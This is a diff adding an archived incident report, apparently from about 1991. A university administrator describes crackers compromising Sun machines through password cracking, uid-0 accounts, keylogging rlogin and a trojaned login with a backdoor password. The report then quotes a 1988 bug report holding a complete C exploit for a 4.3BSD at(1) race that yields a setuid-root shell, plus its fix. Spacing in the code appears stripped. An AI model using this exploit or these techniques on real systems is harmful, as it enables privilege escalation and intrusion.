@@ -1,0 +1,344 @@
+
+>
+>[Neil, as you know, I was going to hold off on sending this until we
+>were sure that the Core Security mailing list was secure.  However,
+>a draft copy of this letter has already fallen into cracker hands;
+>a friend at a remote site discovered that this morning (11/16) at
+>2:35am, his account had been broken into and his mail box grep'd,
+>read and truncated.  So, without further adieu...]
+>
+>[N.B. All times are in MST, 7 hours west of GMT]
+>
+>There is a great deal more going on than what Mel has described.  From
+>what we can tell, there are multiple and distinct groups of people who
+>are actively trying to break security on machines around the Internet.
+>They all seem to favor Suns and NeXT boxes, but as you will soon see,
+>some may have the potential to breach security on a variety of machines.
+>This letter will provide you with the various "Methods of Operation" we
+>have been seeing.
+>
+>As far back as November 2nd, various Sun machines at the University
+>of Utah have been attacked and their security compromised.  We (the
+>Computer Science Department) were first made aware of this wave of
+>attacks on November 8th, when a nearby department was under siege.
+>We believe that these attacks came from "booyong.cs.unsw.oz.au"; the
+>crackers we saw would dial up to "micom0.csd.unsw.OZ.AU" -- a local
+>terminal server with restricted routing -- telnet to "booyong" (which
+>had many accounts with guessable passwords) and then to the Internet.
+>
+>The method of operation for the AU crackers consisted of (there are
+>some holes here, since these were not our machines):
+>
+>- get a local account on machine (somehow)
+>- log in over themselves to wipe out the host name in utmp
+>- otherwise, did not clean up log files very well
+>- bring over "kc.tar", a "Dr. Dissector" password cracker
+>- left program running for 2 days on their machine
+>- may leave a login-simulator running to snarf passwds
+>- create new accounts w/uid 0 (e.g. "axlrose", "daveos")
+>- install a modified rlogin program that logs host, user, and
+>  all keystrokes to a file named "/usr/include/sun/.b<PID>"
+>
+>This same department also received one-time logins to fake accounts from:
+>
+>- rw8.urc.tue.nl, 131.155.2.241 (Ultrix V4.0, Eindhoven U, Netherlands)
+>- 130.159.248.20 (VMS 5.3, Univ of Strathclyde, Glasgow)
+>- formal.culv.unisys.com, 192.67.92.30 (Unisys Corp, Calif)
+>
+>We talked to the administrators of "booyong" on Tuesday and as of
+>Thursday (11/15 in Australia), they had shut down all the cracked
+>accounts.  They claimed that they had seen many password files, and
+>that this wave of attacks seems to have been going as far back as
+>July.  They also indicated that there is a local cracker-bbs, but
+>have no evidence of this.  They gave me a password to one of the
+>cracked accounts so that I could monitor TCP connections; up until
+>Thursday morning (11/14, 1:46am), I saw "jamesw@booyong" login from
+>"micom0" (terminal server), telnet to "maxwell1.ee.mtu.edu" and...
+>
+>This same cracker/group made it to one of our machines (from this
+>nearby department) and I've seen them log in from both "booyong" and
+>"maxwell1.ee.mtu.edu".  From various kinds of logging I had set up,
+>it appeared that these people got bored when they discovered we had
+>shadow passwords.  At this point, we felt that everything was under
+>control.  I should note here that parts of the above text has been
+>excerpted from a letter Jay Lepreau sent to CERT on November 8th.
+>
+>The second wave of attacks started on November 12th at 1:34am.  Donn
+>Seeley noticed that a user from the Math department [*] quietly rsh'd
+>over to "cs.utah.edu".  Later that day, we discovered that at 1:45am,
+>they had used a hole in the "at" program to gain root privileges [**].
+>"Cs.utah.edu" in an hp300 running Utah/4.3BSD and they didnt show much
+>interest in this machine.  Instead, they rsh'd to one of our Sun's and
+>replaced "/usr/bin/login", setting the mod-time back to Oct 11, 1990.
+>
+>[*]  Re: Math department.  The ctime on their Sun's "/etc/passwd" file
+>     was 1:31am, 3 minutes before the rsh to our machine.
+>
+>[**] Re: at hole.  They apparently have a copy of the bug report sent
+>     to (at least) the Berkeley bugs mailing list back on Dec 23, 1988.
+>     They reproduced the hole *exactly* as described in the bug report
+>     (same file names, etc).  I have included the bug report below as
+>     it's clear that crackers are already aware of this hole.
+>
+>Early Thursday morning (11/14) we received a tar file containing a
+>fake login program (sl.c) as well as a program to set mod-times on
+>files (touch.c)... this file was deposited in our anonymous ftp dir.
+>The login program had a trap door, where the password "SECRETPW"
+>would log anyone in and bypass all the standard login logging (utmp,
+>wtmp, etc).  However, the "login" on *our* Sun was different: there
+>was no "SECRETPW", and doing a `strings' and `diff' against the SunOS
+>"login" showed *no* diffs!
+>
+>So, Mike Hibler disassembled our fake "login" program and found that
+>it had the same trap door, HOWEVER they had used the first eight
+>characters of the Copyright line in place of "SECRETPW"... clever!
+>
+>After (hopefully) securing machines here, we started to sift thru our
+>collection of log files and check out what was happening elsewhere on
+>the Internet.  To date, I have talked to administrators at 4 diverse
+>sites and, in summary, things appear to be pretty bad out there.  Here
+>is a list of what these people have discovered (I will include names
+>and sites where I have been given permission):
+>
+>Pete Cottrell, umd, NeXT machine:
+>- copy of zardoz CORE security mailing list (according
+>  to Pete), with postings as recent as Oct 1st, 1991.
+>- copy of program to exploit "at" hole.
+>- setuid root programs in uucp directory.
+>- password files from SURAnet and Hawaii machines.
+>- ".rhosts" files containing "+ +".
+>- aliases.dir file from UUNET.
+>
+>Site in So California (where we received login/mod-time tar file):
+>- modified /bin/login on Suns w/ctime Oct 21st 12:29am
+>  (this is the oldest ctime we have heard of to date).
+>- the tar file contained uid of user who made it... this
+>  corresponds to (one of) the users who was using our
+>  ftp dir to transport files around.
+>
+>A Well-known site in Berkeley:
+>- modified /bin/login on Suns w/ctime Oct 27th.
+>
+>Another well-known site in Berkeley:
+>- some 100 Suns compromised.
+>
+>A local company:
+>- modified /bin/login on Suns
+>
+>There are several more sites that we believe have been compromised.
+>Further, with every passing day (usually from 1am to 5am), we can
+>usually add a couple more sites to our "list".  We dont really have
+>the time to contact each site, and hope that CERT will start doing
+>this.  Until now, we have only received CERT's standard checklist.
+>There should be some kind of announcement made about all of this, as
+>every administrator I spoke with was caught completely off-guard by
+>my phone call.  Of course, the longer it goes on, the better our
+>chances of locating the source(s).
+>
+>I will draw this report to a close now; for the sake of brevity, I
+>left out minor details.  If you need more information, we'll try to
+>help out if at all possible (assuming you can prove that you are
+>really who you say you are :-)).  If you discover that your site was
+>attacked, I'd be interested in receiving a short summary (to add to
+>this report, with your permission).  Also, if one of the crackers is
+>reading this letter, please give me a call... I'm intrigued!  :-)
+>To date, we have not noticed any damage being done to user accounts.
+>
+>Jeff Forys
+>
+>P.S. I trust all of you to redistribute this article (or excerpts) as
+>     is appropriate.
+>
+>========================================================================
+>From: Maarten Litmaath <maart@cs.vu.nl>
+>Date:     Fri, 23 Dec 88 3:54:56 MET
+>Subject:  bug in 4.3BSD at(1) leading to root privileges
+>
+>L.S.
+>Recently I ran into a bug in our 4.3BSD at(1). I don't know if this bug has
+>been discovered before. Anyway, our source wasn't patched. Below is a small
+>program which exploits the bug to create a setuid root shell script in /tmp
+>(don't frown: it was the easiest way out! :-)
+>The fix is very simple; a context diff has been included at the end.
+>As usual the keyword is `race condition': between the calls to fopen() and
+>fchmod(). Every fopen() in a setuid program is suspicious, because the umask
+>might have been set to 0. So we explicitly set the umask, and the fchmod()
+>is unnecessary.
+>Regards,
+>Maarten Litmaath @ VU Amsterdam:
+>maart@cs.vu.nl, mcvax!botter!maart
+>
+>----zip----zip----zip----zip----zip----zip----zip----zip----zip----zip----
+>#include<sys/time.h>
+>#include<sys/wait.h>
+>#include<stdio.h>
+>
+>
+>#defineATSIZE512
+>
+>
+>charAtdir[] = "/usr/spool/at";
+>
+>charAtformat[] = "\
+># owner: root\n\
+># jobname: chkfpd\n\
+># shell: sh\n\
+># notify by mail: no\n\
+>\n\
+>exec 2>&-\n\
+>/bin/echo '#! /bin/sh' > /tmp/-\n\
+>/bin/chmod 6711 /tmp/-\n\
+>exit 0\n\
+>                              \n";
+>
+>char*env[] = {
+>0
+>};
+>
+>intpid;
+>
+>
+>main()
+>{
+>charatfile[ATSIZE], buf[5];
+>intfd;
+>FILE*fp;
+>structtm*tp, *getnowtime();
+>voidmakeatfile(), maketime();
+>
+>
+>maketime(tp = getnowtime());
+>(void) sprintf(buf, "%02d%02d", tp->tm_hour, tp->tm_min);
+>
+>switch (pid = vfork()) {
+>case -1:
+>perror("fork");
+>exit(1);
+>case 0:
+>(void) nice(19);
+>(void) umask(0);
+>(void) execle("/usr/bin/at", "at", "-s", buf,
+>"/dev/null", (char *) 0, env);
+>perror("at");
+>_exit(1);
+>}
+>
+>makeatfile(atfile, tp);
+>
+>while ((fd = open(atfile, 1)) < 0)
+>;
+>
+>printf("OK: ");
+>(void) fflush(stdout);
+>
+>(void) wait((union wait *) 0);
+>
+>fp = fdopen(fd, "w");
+>fprintf(fp, Atformat);
+>(void) fclose(fp);
+>
+>printf("%s\n", buf);/* the time of the atrun */
+>exit(0);
+>}
+>
+>/*
+> * the following routines were stolen and adapted from at.c
+> */
+>
+>structtm*getnowtime()
+>{
+>structtimevaltime;
+>structtm*localtime();
+>
+>
+>if (gettimeofday(&time, (struct timezone *) 0) < 0) {
+>perror("gettimeofday");
+>exit(1);
+>}
+>return localtime(&time.tv_sec);
+>}
+>
+>
+>voidmaketime(tp)
+>structtm*tp;
+>{
+>intmin;
+>
+>
+>if ((min = tp->tm_min) < 29)/* at least 1 minute gap */
+>tp->tm_min = min < 14 ? 15 : 30;
+>else
+>if (min < 44)
+>tp->tm_min = 45;
+>else {
+>tp->tm_min = 0;
+>if (++tp->tm_hour >= 24) {
+>tp->tm_hour = 0;
+>if (++tp->tm_yday >= (tp->tm_year & 03 ? 365 : 366)) {
+>tp->tm_yday = 0;
+>++tp->tm_year;/* no check */
+>}
+>}
+>}
+>}
+>
+>
+>voidmakeatfile(atfile, tp)
+>char*atfile;
+>structtm*tp;
+>{
+>inti;
+>
+>
+>for (i = 0; ; i += 53) {
+>(void) sprintf(atfile, "%s/%02d.%03d.%02d%02d.%02d", Atdir,
+>tp->tm_year, tp->tm_yday, tp->tm_hour, tp->tm_min,
+>(pid + i) % 100);
+>
+>/*
+> * Make sure that the file name that we've created is unique.
+> */
+>
+>if (access(atfile, 0) == -1)
+>return;
+>}
+>}
+>----zip----zip----zip----zip----zip----zip----zip----zip----zip----zip----
+>
+>*** at.c.oldFri Dec 23 01:32:54 1988
+>--- at.c.newSat Dec 24 01:37:06 1988
+>***************
+>*** 287,302 ****
+>
+>  /*
+>   * Open the spoolfile for writing.
+>   */
+>  if ((spoolfile = fopen(atfile, "w")) == NULL){
+>  perror(atfile);
+>  exit(1);
+>  }
+>-
+>- /*
+>-  * Make the file not world readable.
+>-  */
+>- fchmod(fileno(spoolfile), 0400);
+>
+>  /*
+>   * The protection mechanism works like this:
+>--- 287,300 ----
+>
+>  /*
+>   * Open the spoolfile for writing.
+>+  * Set the umask first!
+>   */
+>+
+>+ (void) umask(0377);
+>  if ((spoolfile = fopen(atfile, "w")) == NULL){
+>  perror(atfile);
+>  exit(1);
+>  }
+>
+>  /*
+>   * The protection mechanism works like this:
+>----zip----zip----zip----zip----zip----zip----zip----zip----zip----zip----
+>
